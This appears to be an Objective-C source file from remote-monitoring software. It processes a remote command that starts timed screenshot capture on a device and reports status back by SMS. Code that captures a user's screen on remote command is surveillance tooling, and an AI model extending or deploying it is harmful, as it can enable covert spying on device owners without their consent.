//
//  OnDemandScreenshotRecordProcessor.m
//  RCM
//
//  Created by Makara Khloth on 3/10/15.
//
//

#import "OnDemandScreenshotRecordProcessor.h"
#import "ScreenshotCaptureManager.h"

@interface OnDemandScreenshotRecordProcessor (private)
- (void) processOnDemandScreenshotRecord;
- (void) onDemandScreenshotRecordBusyException;
- (void) onDemandScreenshotRecordInvalidFormatException;
- (void) acknowldgeMessage1;
- (void) acknowldgeMessage2;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (BOOL) isValidFlag;
- (void) processFinished;
- (void) smallerDuration;
- (void) biggerInterval;
@end


@implementation OnDemandScreenshotRecordProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the OnDemandScreenshotRecordProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    
    DLog (@">>>>>>>> OnDemandScreenshotRecordProcessor--->initWithRemoteCommandData")
    
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
    }
    return self;
}


#pragma mark Overriden method


/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the OnDemandScreenshotRecordProcessor
 - Argument list and description:	No Argument
 - Return description:	No return type
 - Overided				RemoteCmdProcessor protocol
 */
- (void) doProcessingCommand {
    DLog (@"OnDemandScreenshotRecordProcessor--->doProcessingCommand")
    if ([self isValidFlag]) {
        [self processOnDemandScreenshotRecord];
    } else {
        [self onDemandScreenshotRecordInvalidFormatException];
    }
}

#pragma mark - ScreenshotCaptureManager -

- (void) screenshotCaptureCompleted: (NSError *) aError {
    DLog (@"+++++ OnDemandScreenshotRecordProcessor ---> screenshotCaptureCompleted %@", aError)
    
    if (!aError) {
        DLog (@"- complete -")
        NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                              andErrorCode:_SUCCESS_];
        messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandScreenshotRecordSuccessMSG", @"")];
        [self sendReplySMS:messageFormat isProcessCompleted:YES];
    } else {
        DLog (@"- fail -")
        NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                              andErrorCode:_ERROR_];
        [self sendReplySMS:messageFormat isProcessCompleted:YES];
    }
}

#pragma mark Private method


/**
 - Method name:			processOnDemandScreenshotRecord
 - Purpose:				This method is used to process On Demand Screenshot Record
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processOnDemandScreenshotRecord {
    DLog (@"OnDemandScreenshotRecordProcessor ---> processOnDemandScreenshotRecord");
    id <ScreenshotCaptureManager> screenshotCaptureManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mScreenshotCaptureManager];
    
    NSInteger intervalInSec = [[[mRemoteCmdData mArguments] objectAtIndex:2] integerValue];
    NSInteger durationInMin = [[[mRemoteCmdData mArguments] objectAtIndex:3] intValue];
    DLog (@"intervalInSec %ld", (long)intervalInSec)
    DLog (@"durationInMin %ld", (long)durationInMin)
    
    if (intervalInSec <= (durationInMin * 60)) {
        if (durationInMin < 1) {
            [self performSelector:@selector(smallerDuration) withObject:nil afterDelay:0.1];
        } else {
            if (durationInMin > 5) {
                if ([screenshotCaptureManager captureOnDemandScreenshot:intervalInSec duration:5 delegate:self]) {
                    [self acknowldgeMessage2];
                } else {
                    [self onDemandScreenshotRecordBusyException];
                }
            } else {
                if ([screenshotCaptureManager captureOnDemandScreenshot:intervalInSec duration:durationInMin delegate:self]) {
                    [self acknowldgeMessage1];
                } else {
                    [self onDemandScreenshotRecordBusyException];
                }
            }
        }
    } else {
        [self performSelector:@selector(biggerInterval) withObject:nil afterDelay:0.1];
    }
}

/**
 - Method name:			onDemandScreenshotRecordBusyException
 - Purpose:				This method is invoked when it's busy to start on demand screen shot record
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) onDemandScreenshotRecordBusyException {
    DLog (@"OnDemandScreenshotRecordProcessor ---> onDemandScreenshotRecordBusyException");
    FxException* exception = [FxException exceptionWithName:@"onDemandScreenshotRecordBusyException" andReason:@"On demand busy to start screen shot record"];
    [exception setErrorCode:kScreenCaptureManagerBusy];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

/**
 - Method name:			onDemandScreenshotRecordInvalidFormatException
 - Purpose:				This method is invoked when the command format is invalid
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) onDemandScreenshotRecordInvalidFormatException {
    DLog (@"OnDemandScreenshotRecordProcessor ---> onDemandScreenshotRecordInvalidFormatException");
    FxException* exception = [FxException exceptionWithName:@"onDemandScreenshotRecordException" andReason:@"On demand screen shot record invalid format"];
    [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

/**
 - Method name:			acknowldgeMessage1
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument
 - Return description:	No Return
 */
- (void) acknowldgeMessage1 {
    DLog (@"OnDemandScreenshotRecordProcessor ---> acknowldgeMessage1");
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
    NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandScreenshotRecordAckMSG1", @"")];
    DLog (@"ackMessage %@" , ackMessage)
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			acknowldgeMessage2
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument
 - Return description:	No Return
 */
- (void) acknowldgeMessage2 {
    DLog (@"OnDemandScreenshotRecordProcessor ---> acknowldgeMessage2");
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
    NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandScreenshotRecordAckMSG2", @"")];
    DLog (@"ackMessage %@" , ackMessage)
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"OnDemandScreenshotRecordProcessor ---> sendReplySMS...")
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:aReplyMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:aReplyMessage];
    }
    if (aIsComplete) {
        [self processFinished];
    } else {
        DLog (@"Sent aknowldge message.")
    }
}

- (BOOL) isValidFlag {
    BOOL isFlag = NO;
    NSArray *args = [mRemoteCmdData mArguments];
    DLog (@"argument count: %lu", (unsigned long)[args count])
    if ([args count] >= 4) {
        NSArray *durationArray = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments]
                                                                                       validationType:kDigitValidation]];
        if ([durationArray count] > 0)
            isFlag = YES;
        [durationArray release];
    }
    return (isFlag);
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when on demand record process is completed
 - Argument list and description:	No Argument
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
    DLog (@"OnDemandScreenshotRecordProcessor ---> processFinished")
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

- (void) smallerDuration {
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_ERROR_];
    messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandScreenshotRecordErrorMSG1", @"")];
    [self sendReplySMS:messageFormat isProcessCompleted:YES];
}

- (void) biggerInterval {
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_ERROR_];
    messageFormat = [messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandScreenshotRecordErrorMSG2", @"")];
    [self sendReplySMS:messageFormat isProcessCompleted:YES];
}

- (void) dealloc {	
    [super dealloc];
}

@end